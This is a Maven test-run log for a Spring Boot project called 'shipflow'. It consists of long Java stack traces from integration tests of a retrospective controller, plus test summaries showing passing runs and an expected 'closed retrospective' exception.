	at com.github.farzadsedaghatbin.shipflow.controller.RetroControllerIntegrationTest$ProjectSettingTests.accessBlockedWhenDisabled(RetroControllerIntegrationTest.java:482) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

[INFO] Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.019 s -- in com.github.farzadsedaghatbin.shipflow.controller.RetroControllerIntegrationTest$ProjectSettingTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.RetroControllerIntegrationTest$CycleRetroStatusTests
[INFO] Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.024 s -- in com.github.farzadsedaghatbin.shipflow.controller.RetroControllerIntegrationTest$CycleRetroStatusTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.RetroControllerIntegrationTest$RetroItemTests
2026-01-17T23:26:46.875Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.e.GlobalExceptionHandler         : Unexpected runtime exception: Cannot add items to a closed retrospective

java.lang.IllegalStateException: Cannot add items to a closed retrospective
	at com.github.farzadsedaghatbin.shipflow.service.RetroService.createRetroItem(RetroService.java:187) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:352) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:196) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:123) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:385) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:119) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:184) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:717) ~[spring-aop-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.service.RetroService$$SpringCGLIB$$0.createRetroItem(<generated>) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.controller.RetroController.createRetroItem(RetroController.java:97) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:352) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:713) ~[spring-aop-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.controller.RetroController$$SpringCGLIB$$0.createRetroItem(<generated>) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:262) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:190) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:118) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:917) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:829) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1089) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:979) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:914) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:590) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:885) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.TestDispatcherServlet.service(TestDispatcherServlet.java:72) ~[spring-test-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:658) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.mock.web.MockFilterChain$ServletFilterProxy.doFilter(MockFilterChain.java:165) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:110) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:108) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.FilterChainProxy.lambda$doFilterInternal$3(FilterChainProxy.java:231) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$FilterObservation$SimpleFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:479) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:340) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator.lambda$wrapSecured$0(ObservationFilterChainDecorator.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:128) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:131) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:85) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.JwtAuthenticationFilter.doFilterInternal(JwtAuthenticationFilter.java:46) ~[classes/:na]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
